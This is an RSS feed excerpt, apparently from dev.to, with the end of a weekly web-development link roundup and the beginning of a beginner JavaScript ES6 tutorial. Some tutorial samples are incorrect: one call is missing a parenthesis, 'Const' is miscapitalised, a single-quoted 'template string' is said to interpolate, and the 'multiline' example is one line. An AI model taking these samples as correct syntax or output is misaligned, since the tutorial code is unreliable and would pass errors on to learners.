            &lt;img alt="Tailwind CSS Tooltips" src="https://camo.githubusercontent.com/e1a67508c56a40bd950b8616201f1e44a5b42358c096ec236bdd335fddd6a5c6/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f746f6f6c746970732e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
        &lt;a href="https://flowbite.com/docs/plugins/datepicker/" rel="nofollow"&gt;
            &lt;img alt="Tailwind CSS Datepicker" src="https://camo.githubusercontent.com/89a9672d4a0cb06ddc3def1d64c82be382a6e82a7af12c4cf00739bbf7af1ee5/68747470733a2f2f666c6f77626974652e73332e616d617a6f6e6177732e636f6d2f6769746875622f646174657069636b65722e6a7067"&gt;
        &lt;/a&gt;
    &lt;/td&gt;
    &lt;td width="33.3333%"&gt;
    &lt;/td&gt;
  &lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;
&lt;p&gt;👉 &lt;a href="https://flowbite.com/docs/getting-started/introduction/" rel="nofollow"&gt;See all components&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
Getting started&lt;/h2&gt;
&lt;p&gt;Flowbite can be included as a plugin into an existing Tailwind CSS project and it is supposed to help you build websites faster by having a set of web components to work with built with the utility classes from Tailwind CSS.&lt;/p&gt;
&lt;h3&gt;
Require via NPM&lt;/h3&gt;
&lt;p&gt;Make sure that you have &lt;a href="https://nodejs.org/en/" rel="nofollow"&gt;Node.js&lt;/a&gt; and &lt;a href="https://tailwindcss.com/" rel="nofollow"&gt;Tailwind CSS&lt;/a&gt; installed.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Install Flowbite as a dependency using NPM by running the following command:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight highlight-source-shell position-relative overflow-auto js-code-highlight"&gt;
&lt;pre&gt;npm i @themesberg/flowbite&lt;/pre&gt;

&lt;/div&gt;
&lt;ol start="2"&gt;
&lt;li&gt;Require Flowbite…&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/themesberg/flowbite"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#dribbble-shots"&gt;
  &lt;/a&gt;
  dribbble shots
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#hr-dashboard"&gt;
  &lt;/a&gt;
  HR Dashboard
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--29UR8U9e--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.dribbble.com/users/1619633/screenshots/17335594/media/eb9c7fb924f5ada2f134be955830eceb.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--29UR8U9e--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.dribbble.com/users/1619633/screenshots/17335594/media/eb9c7fb924f5ada2f134be955830eceb.png" alt="by [Afshin T2Y](https://dribbble.com/shots/17335594-HR-Dashboard)" width="880" height="660"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;by &lt;a href="https://dribbble.com/shots/17335594-HR-Dashboard"&gt;Afshin T2Y&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#medical-service-mobile-app"&gt;
  &lt;/a&gt;
  Medical service - Mobile App
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MzAMRiWa--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.dribbble.com/users/4189231/screenshots/17316684/media/247b643be7f11451c14fecdda9926f59.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MzAMRiWa--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.dribbble.com/users/4189231/screenshots/17316684/media/247b643be7f11451c14fecdda9926f59.png" alt="by [Anastasia](https://dribbble.com/shots/17316684-Medical-service-Mobile-App)" width="880" height="660"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;by &lt;a href="https://dribbble.com/shots/17316684-Medical-service-Mobile-App"&gt;Anastasia&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#supbank-landing-page-design"&gt;
  &lt;/a&gt;
  Supbank Landing page design
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Ug3ZF0eW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.dribbble.com/users/1607758/screenshots/17291952/media/1afbfcca155ddeb6651400c6bc47323b.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Ug3ZF0eW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.dribbble.com/users/1607758/screenshots/17291952/media/1afbfcca155ddeb6651400c6bc47323b.png" alt="by [Basit A. khan](https://dribbble.com/shots/17291952-Supbank-Landing-page-design)" width="880" height="660"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;by &lt;a href="https://dribbble.com/shots/17291952-Supbank-Landing-page-design"&gt;Basit A. khan&lt;/a&gt;&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#tweets"&gt;
  &lt;/a&gt;
  Tweets
&lt;/h2&gt;


&lt;blockquote class="ltag__twitter-tweet"&gt;
      &lt;div class="ltag__twitter-tweet__media"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--V8LGIpBS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/media/FJKqmqsVkAInWw1.jpg" alt="unknown tweet media content"&gt;
      &lt;/div&gt;

  &lt;div class="ltag__twitter-tweet__main"&gt;
    &lt;div class="ltag__twitter-tweet__header"&gt;
      &lt;img class="ltag__twitter-tweet__profile-image" src="https://res.cloudinary.com/practicaldev/image/fetch/s--tgNdW7xD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/profile_images/1471646681082990593/DBu9tgLk_normal.jpg" alt="Addy Osmani profile image"&gt;
      &lt;div class="ltag__twitter-tweet__full-name"&gt;
        Addy Osmani
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__username"&gt;
        &lt;a class="mentioned-user" href="https://dev.to/addyosmani"&gt;@addyosmani&lt;/a&gt;
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__twitter-logo"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir1kO05j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg" alt="twitter logo"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__body"&gt;
      Good defaults make a difference! Here's &lt;a href="https://twitter.com/sveltejs"&gt;@sveltejs&lt;/a&gt; and SvelteKit: Great perf, SSR, minimal JS for interactivity, file-based routing, build-time optimizations baked in (w/&lt;a href="https://twitter.com/vite_js"&gt;@vite_js&lt;/a&gt;). A lot to like :) &lt;a href="https://t.co/NtH30xubIM"&gt;kit.svelte.dev&lt;/a&gt; 
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__date"&gt;
      20:22 PM - 15 Jan 2022
    &lt;/div&gt;


    &lt;div class="ltag__twitter-tweet__actions"&gt;
      &lt;a href="https://twitter.com/intent/tweet?in_reply_to=1482448045891485700" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fFnoeFxk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-reply-action-238fe0a37991706a6880ed13941c3efd6b371e4aefe288fe8e0db85250708bc4.svg" alt="Twitter reply action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/retweet?tweet_id=1482448045891485700" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k6dcrOn8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-retweet-action-632c83532a4e7de573c5c08dbb090ee18b348b13e2793175fea914827bc42046.svg" alt="Twitter retweet action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/like?tweet_id=1482448045891485700" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SRQc9lOp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-like-action-1ea89f4b87c7d37465b0eb78d51fcb7fe6c03a089805d7ea014ba71365be5171.svg" alt="Twitter like action"&gt;
      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;



&lt;blockquote class="ltag__twitter-tweet"&gt;
      &lt;div class="ltag__twitter-tweet__media"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--lz4gIoG5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/media/FJZ59JGXwAA3evs.png" alt="unknown tweet media content"&gt;
      &lt;/div&gt;

  &lt;div class="ltag__twitter-tweet__main"&gt;
    &lt;div class="ltag__twitter-tweet__header"&gt;
      &lt;img class="ltag__twitter-tweet__profile-image" src="https://res.cloudinary.com/practicaldev/image/fetch/s--hgJJJOEL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/profile_images/1301790322079551488/m9ULCtaP_normal.jpg" alt="Luca Casonato profile image"&gt;
      &lt;div class="ltag__twitter-tweet__full-name"&gt;
        Luca Casonato
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__username"&gt;
        @lcasdev
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__twitter-logo"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir1kO05j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg" alt="twitter logo"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__body"&gt;
      A Node -&amp;gt; Deno cheatsheet 
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__date"&gt;
      18:31 PM - 18 Jan 2022
    &lt;/div&gt;


    &lt;div class="ltag__twitter-tweet__actions"&gt;
      &lt;a href="https://twitter.com/intent/tweet?in_reply_to=1483507347859378182" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fFnoeFxk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-reply-action-238fe0a37991706a6880ed13941c3efd6b371e4aefe288fe8e0db85250708bc4.svg" alt="Twitter reply action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/retweet?tweet_id=1483507347859378182" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k6dcrOn8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-retweet-action-632c83532a4e7de573c5c08dbb090ee18b348b13e2793175fea914827bc42046.svg" alt="Twitter retweet action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/like?tweet_id=1483507347859378182" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SRQc9lOp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-like-action-1ea89f4b87c7d37465b0eb78d51fcb7fe6c03a089805d7ea014ba71365be5171.svg" alt="Twitter like action"&gt;
      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;



&lt;blockquote class="ltag__twitter-tweet"&gt;
      &lt;div class="ltag__twitter-tweet__media ltag__twitter-tweet__media__video-wrapper"&gt;
        &lt;div class="ltag__twitter-tweet__media--video-preview"&gt;
          &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--z0RoBM3X--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/ext_tw_video_thumb/1484696988268392448/pu/img/tZpbDrDAZqSS_3oL.jpg" alt="unknown tweet media content"&gt;
          &lt;img src="/assets/play-butt.svg" class="ltag__twitter-tweet__play-butt" alt="Play butt"&gt;
        &lt;/div&gt;
        &lt;div class="ltag__twitter-tweet__video"&gt;
          
            
          
        &lt;/div&gt;
      &lt;/div&gt;

  &lt;div class="ltag__twitter-tweet__main"&gt;
    &lt;div class="ltag__twitter-tweet__header"&gt;
      &lt;img class="ltag__twitter-tweet__profile-image" src="https://res.cloudinary.com/practicaldev/image/fetch/s--tgNdW7xD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/profile_images/1471646681082990593/DBu9tgLk_normal.jpg" alt="Addy Osmani profile image"&gt;
      &lt;div class="ltag__twitter-tweet__full-name"&gt;
        Addy Osmani
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__username"&gt;
        &lt;a class="mentioned-user" href="https://dev.to/addyosmani"&gt;@addyosmani&lt;/a&gt;
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__twitter-logo"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir1kO05j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg" alt="twitter logo"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__body"&gt;
      CSS Scroll Snap: &lt;a href="https://t.co/6qkWfvlnCK"&gt;bit.ly/scroll-snap&lt;/a&gt; ~ lock the viewport to certain elements after the user finishes scrolling. Ace for advanced interactions. Also see &lt;a href="https://t.co/Q5AiH2lPTn"&gt;bit.ly/csssnap&lt;/a&gt; to learn more. h/t &lt;a href="https://twitter.com/argyleink"&gt;@argyleink&lt;/a&gt; &lt;a class="mentioned-user" href="https://dev.to/una"&gt;@una&lt;/a&gt; @maxkoehler 
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__date"&gt;
      23:00 PM - 22 Jan 2022
    &lt;/div&gt;


    &lt;div class="ltag__twitter-tweet__actions"&gt;
      &lt;a href="https://twitter.com/intent/tweet?in_reply_to=1485024476974694400" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fFnoeFxk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-reply-action-238fe0a37991706a6880ed13941c3efd6b371e4aefe288fe8e0db85250708bc4.svg" alt="Twitter reply action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/retweet?tweet_id=1485024476974694400" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k6dcrOn8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-retweet-action-632c83532a4e7de573c5c08dbb090ee18b348b13e2793175fea914827bc42046.svg" alt="Twitter retweet action"&gt;
      &lt;/a&gt;
      &lt;a href="https://twitter.com/intent/like?tweet_id=1485024476974694400" class="ltag__twitter-tweet__actions__button"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SRQc9lOp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-like-action-1ea89f4b87c7d37465b0eb78d51fcb7fe6c03a089805d7ea014ba71365be5171.svg" alt="Twitter like action"&gt;
      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;





&lt;h2&gt;
  &lt;a href="#picked-pens"&gt;
  &lt;/a&gt;
  Picked Pens
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#generative-phpstorm-loader"&gt;
  &lt;/a&gt;
  Generative PhpStorm Loader
&lt;/h3&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/anthony-dee/embed/NWaVgpz?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;by Anthony Douglas&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#sign-up-login"&gt;
  &lt;/a&gt;
  Sign Up / Login
&lt;/h3&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/marcobiedermann/embed/MWENzNZ?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;by &lt;a href="https://twitter.com/BiedermannMarco"&gt;Marco Biedermann&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#illusion"&gt;
  &lt;/a&gt;
  Illusion
&lt;/h3&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/antoniasymeonidou/embed/ExwJdPd?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;by &lt;a href="https://twitter.com/NanouuSymeon"&gt;NANOUU&lt;/a&gt;&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#podcasts-worth-listening"&gt;
  &lt;/a&gt;
  Podcasts worth listening
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#codepen-radio-moving-to-postgresql-from-mysql"&gt;
  &lt;/a&gt;
  CodePen Radio – &lt;strong&gt;Moving to PostgreSQL from MySQL&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;As you read this, CodePen is 100% on PostgreSQL for our main relational database. It was a transition that took a couple of weeks of pretty intense effort and lots of planning and prep before that.&lt;/p&gt;

&lt;p&gt;&lt;iframe src="https://open.spotify.com/embed/episode/0NoIUPFhIyqtdUgvuObDGv" width="100%" height="232px"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#syntax-new-year-new-you-what-to-focus-on-in-2022"&gt;
  &lt;/a&gt;
  Syntax – New Year, New You. What to Focus on in 2022
&lt;/h3&gt;

&lt;p&gt;In this episode of Syntax, Scott and Wes talk through what to focus on at beginner, intermediate, and advanced levels of coding skills.&lt;/p&gt;

&lt;p&gt;&lt;iframe src="https://open.spotify.com/embed/episode/14kmWWaZRIM1CzspbnU4xx" width="100%" height="232px"&gt;
&lt;/iframe&gt;
&lt;/p&gt;




&lt;p&gt;Thank you for reading, talk to you next week, and stay safe! 👋&lt;/p&gt;

</description>
      <category>css</category>
      <category>javascript</category>
      <category>webdev</category>
      <category>news</category>
    </item>
    <item>
      <title>JavaScript ES6</title>
      <author>Buddhadeb Chhetri</author>
      <pubDate>Sun, 23 Jan 2022 18:08:31 +0000</pubDate>
      <link>https://dev.to/buddhadebchhetri/javascript-es6-ilj</link>
      <guid>https://dev.to/buddhadebchhetri/javascript-es6-ilj</guid>
      <description>&lt;p&gt;JavaScript was invented by Brendan Eich in 1995, and became an ECMA standard in 1997.&lt;/p&gt;

&lt;p&gt;ECMAScript is the official name of the language.&lt;/p&gt;

&lt;p&gt;ECMAScript versions have been abbreviated to ES1, ES2, ES3, ES5, and ES6.&lt;/p&gt;

&lt;p&gt;Since 2016 new versions are named by year (ECMAScript 2016 / 2017 / 2018).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#arrow-function"&gt;
  &lt;/a&gt;
  Arrow Function
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;//prints 8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#default-parameters"&gt;
  &lt;/a&gt;
  Default parameters
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="c1"&gt;//prints 5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#let-scope"&gt;
  &lt;/a&gt;
  Let Scope
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//prints 5&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//prints 3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#const"&gt;
  &lt;/a&gt;
  Const
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;//can be assigned only once&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="c1"&gt;// Here x is 50&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;// Here x is 16&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Here x is 50&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#multiline-string"&gt;
  &lt;/a&gt;
  Multiline String
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;This is a multiline string&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#template-string"&gt;
  &lt;/a&gt;
  Template string
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;World&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Hello ${name}&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;//Prints Hello World&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#exponent-operator"&gt;
  &lt;/a&gt;
  Exponent Operator
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="c1"&gt;//same as : Math.pow(2,8)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#spread-operator"&gt;
  &lt;/a&gt;
  Spread Operator
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;Const&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
